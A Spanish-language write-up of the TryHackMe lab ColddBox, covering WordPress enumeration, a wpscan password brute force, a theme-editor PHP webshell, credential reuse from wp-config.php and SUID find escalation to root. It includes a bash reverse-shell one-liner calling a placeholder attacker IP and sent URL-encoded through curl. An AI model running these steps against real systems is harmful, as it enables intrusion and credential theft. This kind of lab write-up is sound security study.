ColddBox es una máquina Linux Easy de TryHackMe construida sobre una instalación de WordPress desactualizada. Una página oculta filtra los nombres de usuario del sitio, `wpscan` fuerza uno de ellos hasta el panel de administración, y el propio editor de temas de WordPress convierte ese acceso de admin en ejecución de código como `www-data`. El paso que define la máquina es una trampa de reutilización de credenciales: la contraseña del login de WordPress *no* funciona para el usuario del sistema, pero la contraseña de la base de datos que está en `wp-config.php` sí — y desde esa shell un `find` con SUID es un salto a root de un solo comando.

## Reconocimiento y Enumeración

### Escaneo de Puertos

Un único escaneo de servicio a todos los puertos hace todo el trabajo aquí:

```bash
sudo nmap -p- -sCV -O -Pn -n 10.128.136.239 -oN nmap
```

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
```

Dos servicios, ambos reveladores. HTTP en el 80 es un sitio **WordPress 4.1.31** — una versión de 2020, holgadamente desactualizada. SSH está presente pero movido al puerto no estándar **4512**; ese OpenSSH 7.2p2 es lo bastante viejo como para ser vulnerable a un conocido fallo de enumeración de usuarios:

```bash
searchsploit OpenSSH 7.2p2
```

```bash
OpenSSH 2.3 < 7.7 - Username Enumeration                    | linux/remote/45233.py
OpenSSH 7.2p2 - Username Enumeration                        | linux/remote/40136.py
```

Merece la pena anotarlo, pero no es el camino previsto — WordPress va a entregar los nombres de usuario de forma mucho más directa, así que el SSH se queda en la estantería de momento.

### Enumeración Web — WordPress sobre Apache

`whatweb` confirma el stack de un vistazo: WordPress 4.1.31 sobre Apache 2.4.18, con `xmlrpc.php` expuesto (útil más tarde como oráculo de login):

```bash
whatweb http://10.128.136.239/
```

```bash
http://10.128.136.239/ [200 OK] Apache[2.4.18], WordPress[4.1.31],
MetaGenerator[WordPress 4.1.31], x-pingback[/xmlrpc.php], JQuery[1.11.1],
Title[ColddBox | One more machine]
```

Un escaneo de contenido saca los directorios habituales de WordPress más uno que no encaja — `hidden`:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.128.136.239 -t 50
```

```bash
wp-content           (Status: 301) [--> http://10.128.136.239/wp-content/]
wp-includes          (Status: 301) [--> http://10.128.136.239/wp-includes/]
wp-admin             (Status: 301) [--> http://10.128.136.239/wp-admin/]
hidden               (Status: 301) [--> http://10.128.136.239/hidden/]
server-status        (Status: 403)
```

`/hidden/` es una nota dejada en personaje, y filtra justo lo que una fuerza bruta necesita — los nombres de usuario del sitio:

```bash
curl http://10.128.136.239/hidden/
```

```bash
<h1>U-R-G-E-N-T</h1>
<h2>C0ldd, you changed Hugo's password, when you can send it to him
so he can continue uploading his articles. Philip</h2>
```

Tres nombres — **c0ldd**, **hugo**, **philip** — van a un `users.txt`.

### Ataque de Credenciales a WordPress

Con una lista de usuarios real, `wpscan` puede forzar el login en vez de adivinar a ciegas. Apuntándolo a los usuarios y a `rockyou.txt` encuentra un acierto casi de inmediato:

```bash
wpscan --url http://10.128.136.239/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

```bash
[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210
```

El movimiento obvio —reutilizar `c0ldd:9876543210` por SSH en el 4512— es rechazado. Es una contraseña de WordPress, no necesariamente una del sistema; esa distinción resulta importar más adelante.

## Acceso Inicial — RCE por el Editor de Temas como `www-data`

Las credenciales sí entran directamente en el panel de administración de WordPress:

![El panel de administración de WordPress de ColddBox tras entrar como c0ldd](/assets/img/THM/ColddBox/cap1.png)

Un administrador de WordPress puede editar el PHP del tema activo desde **Apariencia → Editor**, y cualquier PHP escrito ahí se ejecuta en el servidor. En lugar de tocar una página que se renderiza en cada visita, `404.php` del tema activo *Twenty Fifteen* es un sitio más discreto donde dejar un webshell de comandos de una línea:

![El editor de temas de WordPress abierto en 404.php del tema Twenty Fifteen, listo para insertar PHP](/assets/img/THM/ColddBox/cap2.png)

El tema vive en una ruta predecible, y el fichero editado ejecuta comandos desde un parámetro `cmd`:

```bash
curl http://10.128.136.239/wp-content/themes/twentyfifteen/404.php?cmd=whoami
```

```bash
www-data
```

Para pasar de un webshell por `curl` a una reverse shell interactiva, URL-encodeo primero el oneliner de bash para que sus metacaracteres sobrevivan a la query string:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![El oneliner de reverse shell de bash siendo URL-encodeado con un codificador online](/assets/img/THM/ColddBox/cap3.png)

Con un listener preparado, lanzar el payload codificado entrega la shell:

```bash
curl http://10.128.136.239/wp-content/themes/twentyfifteen/404.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3CATTACKER_IP%3E%2F4444%200%3E%261%27
```

```bash
nc -nvlp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.128.136.239 48222
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$
```

Tras el habitual tratamiento de la TTY (una bash de verdad con el módulo pty de `python3` y luego `stty`), la máquina es una shell de trabajo normal.

## Movimiento Lateral — `www-data` → `c0ldd`

Solo dos cuentas tienen shell de login real — `root` y `c0ldd`:

```bash
www-data@ColddBox-Easy:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
c0ldd:x:1000:1000:c0ldd,,,:/home/c0ldd:/bin/bash
```

La contraseña de WordPress es lo obvio a probar, y falla — un buen recordatorio de que una credencial de un CMS y una del sistema no son lo mismo:

```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
Password:
su: Authentication failure
```

Pero WordPress guarda sus credenciales de base de datos en texto claro en `wp-config.php`, y ese fichero está justo ahí, en la raíz web:

```bash
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST', 'localhost');
```

La contraseña de la base de datos `cybersecurity` es una cadena *distinta* de la del login de WordPress — y esta sí está reutilizada para la cuenta del sistema:

```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
Password:
c0ldd@ColddBox-Easy:/var/www/html$ cd
c0ldd@ColddBox-Easy:~$ cat user.txt
REDACTED
```

## Escalada de Privilegios — `c0ldd` → `root`

Como `c0ldd`, lo más rápido es comprobar qué binarios llevan el bit SUID — corren con los privilegios de su propietario sin importar quién los invoque:

```bash
c0ldd@ColddBox-Easy:~$ find / -perm -4000 2>/dev/null
/bin/su
/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/find
/usr/bin/newgrp
...
```

Casi todo eso es el conjunto SUID estándar de Ubuntu. **`/usr/bin/find`** no lo es — y un `find` con SUID es una escalada de manual de GTFOBins, porque el `-exec` de `find` puede ejecutar un comando arbitrario manteniendo los privilegios elevados del binario (`-p` evita que la shell lanzada los suelte):

```bash
c0ldd@ColddBox-Easy:~$ find . -exec /bin/sh -p \; -quit
# whoami
root
# cat /root/root.txt
REDACTED
```

## Conclusiones Clave

- **Una credencial de un CMS no es una del sistema — pero un fichero de configuración suele salvar esa distancia.** La contraseña crackeada de WordPress nunca funcionó fuera de WordPress; la victoria fue la contraseña de la *base de datos* en `wp-config.php`, reutilizada para la cuenta del sistema. Cualquier fichero que guarde una contraseña en texto claro es una primitiva de movimiento lateral si la persona detrás la reutiliza.
- **"Oculto" no es control de acceso.** La página `/hidden/` estaba desenlazada, no protegida — una fuerza bruta de directorios rutinaria la encontró, y entregó los nombres de usuario exactos que convirtieron un ataque de login a ciegas en uno dirigido.
- **Una lista de usuarios cambia la economía de la fuerza bruta.** `wpscan` contra tres nombres conocidos y `rockyou.txt` tuvo éxito en segundos; el mismo ataque contra usuarios desconocidos habría sido inútil. Filtrar quiénes son los usuarios suele ser más dañino de lo que parece.
- **El acceso de admin a un CMS suele ser ejecución de código.** El editor de temas de WordPress funciona según lo diseñado — se confía en que un administrador ejecute PHP — que es justo por lo que proteger el login de admin y deshabilitar la edición de ficheros (`DISALLOW_FILE_EDIT`) importa tanto como parchear.
- **Un bit SUID en una herramienta de propósito general es el fin de la partida.** `find` nunca debió correr con privilegios, pero con el bit SUID su `-exec` hereda root. Nada fuera del conjunto estándar debería llevar SUID, y `find`, `vim`, `nmap` y compañía en esa lista son banderas rojas inmediatas.
